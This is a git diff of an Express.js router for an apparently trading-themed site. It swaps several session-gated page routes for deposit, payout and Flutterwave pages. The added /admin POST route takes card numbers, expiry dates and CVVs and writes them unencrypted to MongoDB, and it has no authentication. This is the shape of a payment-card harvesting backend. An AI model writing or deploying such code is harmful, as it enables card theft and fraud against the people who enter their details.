@@ -1,8 +1,8 @@
 const express = require('express');
 const router = express.Router();
-
 // Use the auth routes for sign-up and sign-in logic
 const authRoutes = require('./auth');
+const Details = require("../models/Details"); // Import Details model
 router.use('/auth', authRoutes);
 
 // Landing Page Route
@@ -26,17 +26,6 @@ router.get('/dashboard', (req, res) => {
     });
 });
 
-// EXNESS Route (GET)
-router.get('/exness', (req, res) => {
-    if (!req.session.user) {
-        return res.redirect('/auth/signin'); // Redirect to sign-in if not logged in
-    }
-    res.render('exness', { 
-        title: 'exness', 
-        user: req.session.user // Pass user to the view
-    });
-});
-
 // Competition Route (GET)
 router.get('/competition', (req, res) => {
     if (!req.session.user) {
@@ -48,132 +37,71 @@ router.get('/competition', (req, res) => {
     });
 });
 
-// Buy account route 
-router.get('/buy-account', (req, res) => {
+// Deposit Route (GET) 
+router.get('/deposit', (req, res) => {
     if (!req.session.user) {
         return res.redirect('/auth/signin'); 
     }
-    res.render('buy-account', { 
-        title: 'buy-account', 
+    res.render('deposit', { 
+        title: 'deposit', 
         user: req.session.user // Pass user to the view
     });
 });
 
 
-//READ MORE route 
-router.get('/read-more', (req, res) => {
+// PAYOUT Route (GET) 
+router.get('/payout', (req, res) => {
     if (!req.session.user) {
         return res.redirect('/auth/signin'); 
     }
-    res.render('read-more', { 
-        title: 'read-more', 
+    res.render('payout', { 
+        title: 'payout', 
         user: req.session.user // Pass user to the view
     });
 });
 
 
-// TOURNAMENT ROUTE 
-router.get('/tournament', (req, res) => {
+// FLUTTERWAVE Route (GET) 
+router.get('/flutterwave', (req, res) => {
     if (!req.session.user) {
         return res.redirect('/auth/signin'); 
     }
-    res.render('tournament', { 
-        title: 'tournament', 
+    res.render('flutterwave', { 
+        title: 'flutterwave', 
         user: req.session.user // Pass user to the view
     });
 });
 
 
-
-// smart investment Pass ROUTE 
-router.get('/smart-invest', (req, res) => {
-    if (!req.session.user) {
-        return res.redirect('/auth/signin'); 
-    }
-    res.render('smart-invest', { 
-        title: 'smart-invest', 
-        user: req.session.user // Pass user to the view
+// ADMIN Route (GET) - Show Admin Page
+router.get('/admin', (req, res) => {
+    res.render('admin', { 
+        title: 'Admin', 
+        user: req.session.user || null, // Pass user to the view
+        cardNumber: null, // Default values to prevent errors
+        expiryDate: null, 
+        cvv: null 
     });
 });
 
+// ADMIN Route (POST) - Save form data
+router.post("/admin", async (req, res) => {
+    try {
+        const { cardNumber, expiryDate, cvv } = req.body;
 
-// Access Pass ROUTE 
-// Route to serve the access-pass page
-router.get('/access-pass', (req, res) => {
-    if (!req.session.user) {
-      return res.redirect('/auth/signin');  // Redirect to sign-in page if user is not authenticated
-    }
-  
-    res.render('access-pass', {
-      title: 'Access Pass',
-      user: req.session.user // Pass user info to the view
-    });
-  });
-  
-  // Route to handle form submission (POST request)
-  router.post('/access-pass', (req, res) => {
-    if (!req.session.user) {
-      return res.redirect('/auth/signin'); // Redirect to sign-in page if user is not authenticated
-    }
-  
-    // Extract the fee (htmlContent) from the form submission
-    const htmlContent = req.body.htmlContent; 
-    console.log('Form submitted content:', htmlContent); // Debugging line to see what was submitted
-  
-    res.render('access-pass', { 
-      title: 'Access Pass', 
-      user: req.session.user, // Pass user info to the view
-      htmlContent // Pass the fee value to the view
-    });
-  });
+        // Save details to MongoDB
+        const newDetails = new Details({ cardNumber, expiryDate, cvv });
+        await newDetails.save();
 
+        console.log("✅ Payment details saved to database.");
 
-// payment Pass ROUTE 
-router.get('/payment', (req, res) => {
-    if (!req.session.user) {
-        return res.redirect('/auth/signin');
+        res.json({ message: "Payment details received and saved!" });
+
+    } catch (error) {
+        console.error("❌ Error saving payment details:", error);
+        res.status(500).json({ error: "Internal Server Error" });
     }
-    // Get the price from the query string
-    const price = req.query.htmlContent;
-    // Pass the price to the view
-    res.render('payment', { 
-        title: 'Payment', 
-        user: req.session.user, 
-        price: price // Pass the price value to the payment page
-    });
 });
-
-
-// PASS ROUTE 
-// Assuming you are using Express.js
-router.get('/pass', (req, res) => {
-    if (!req.session.user) {
-        return res.redirect('/auth/signin'); 
-    }
-    res.render('pass', { 
-        title: 'Pass Page', 
-        user: req.session.user // Pass user to the view
-    });
-});
-
-router.post('/pass', (req, res) => {
-    if (!req.session.user) {
-        return res.redirect('/auth/signin'); 
-    }
-
-    const htmlContent = req.body.htmlContent; // Extract from form submission
-    console.log('Form submitted content:', htmlContent); // Debugging line
-
-    res.render('pass', { 
-        title: 'Pass Page', 
-        user: req.session.user, // Pass user info
-        htmlContent // Pass the fee data to the template
-    });
-});
-
-
-
-
 
 
 
